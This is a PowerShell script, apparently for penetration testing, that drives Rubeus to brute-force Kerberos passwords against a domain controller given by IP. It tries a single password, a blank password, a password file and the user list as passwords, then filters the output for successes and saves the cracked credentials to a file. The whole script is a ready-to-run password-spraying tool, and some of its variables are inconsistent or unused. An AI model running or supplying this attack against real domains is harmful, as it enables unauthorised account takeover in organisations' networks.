<#

1) Set Variables

$global:target="192.168.80.50"
$global:domain = "SECURE.local"
$global:userlist = "users.txt"
#

2) run the script 

./brute_rubeus.ps1

#>


$global:target=$args[0]


function run-rubeus {
#$userlist =  "users.txt"
#$userlist =  "C:\Windows\Temp\dusers.txt"

# custom password list 
$passlist = "pass100.txt"


date 

.\Rubeus_4.5.exe brute /password:password /dc:$target /noticket
Get-Content .\rubeus_brute.txt | findstr STUPENDOUS | sort-object| Get-Unique > rubeus_brute_cracked.txt

.\Rubeus_4.5.exe brute /password:pass5.txt /dc:$target /noticket
Get-Content .\rubeus_brute.txt | findstr STUPENDOUS | sort-object| Get-Unique > rubeus_brute_cracked.txt

.\Rubeus_4.5.exe brute /password:" " /dc:$target /noticket
Get-Content .\rubeus_brute.txt | findstr STUPENDOUS | sort-object| Get-Unique > rubeus_brute_cracked.txt

.\Rubeus_4.5.exe brute /password:$userlist /dc:$target /noticket
Get-Content .\rubeus_brute.txt | findstr STUPENDOUS | sort-object| Get-Unique > rubeus_brute_cracked.txt

date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content .\rubeus_brute_cracked.txt
}

if ($target) { 
run-rubeus | Tee rubeus_brute.txt
} else {
Write-Host "USEAGE: " 
Write-Host "	./rubeus-brute.ps1 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}



